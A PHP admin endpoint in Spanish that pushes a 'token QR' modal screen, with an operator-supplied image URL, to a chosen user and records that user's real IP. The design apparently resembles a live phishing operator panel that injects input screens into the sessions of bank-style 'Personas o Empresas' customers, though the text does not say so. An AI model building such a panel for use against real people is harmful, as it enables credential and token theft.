<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/../php_config/tela_modales_helpers.php';
verificarAuth();

define('TOKEN_QR_EMPRESA_PREFIX', '[[TOKEN_QR_EMPRESA]]');

function validarUrlImagenQr(string $url): bool
{
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?? '');
    if (!in_array($scheme, ['http', 'https'], true)) {
        return false;
    }

    $path = parse_url($url, PHP_URL_PATH) ?? '';

    return (bool) preg_match('/\.(png|jpe?g|webp|gif)$/i', $path);
}

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$admin_id = intval($_SESSION['admin_id'] ?? 0);
$ip_usuario = $input['ip_usuario'] ?? 'panel';
$imagen_url = trim($input['imagen_url'] ?? '');

if (!$usuario_id) {
    jsonError('ID de usuario no válido');
}

if ($imagen_url === '' || !validarUrlImagenQr($imagen_url)) {
    jsonError('Ingresa una URL válida de imagen (.png, .jpg, .jpeg, .webp o .gif)');
}

try {
    $stmtUser = $pdo->prepare('SELECT id, apellido, ip_real FROM usuarios WHERE id = ?');
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        jsonError('Usuario no encontrado', 404);
    }

    if (!tokenPantallaUsaControl($usuario)) {
        jsonError('La tela de token QR solo aplica para usuarios Personas o Empresas');
    }

    $ip_real = $usuario['ip_real'] ?: $ip_usuario;

    $payload = json_encode([
        'label' => 'Token QR ENVIADO',
        'imagen' => $imagen_url,
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $mensaje = TOKEN_QR_EMPRESA_PREFIX . $payload;

    $pdo->beginTransaction();

    cancelarTelasModalesPendientes($pdo, $usuario_id);

    $updUser = $pdo->prepare('UPDATE usuarios SET token_qr_imagen_url = ? WHERE id = ?');
    $updUser->execute([$imagen_url, $usuario_id]);

    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
        VALUES (?, ?, ?, 'con_input', ?, 'pendiente')
    ");

    if (!$stmt->execute([$usuario_id, $admin_id, $mensaje, $ip_real])) {
        $pdo->rollBack();
        jsonError('Error al enviar la tela de token QR', 500);
    }

    $pdo->commit();

    jsonResponse([
        'success' => true,
        'message' => 'Tela de token QR enviada correctamente',
        'mensaje_id' => (int) $pdo->lastInsertId(),
    ]);
} catch (Exception $e) {
    if ($pdo->inTransaction()) {
        $pdo->rollBack();
    }
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
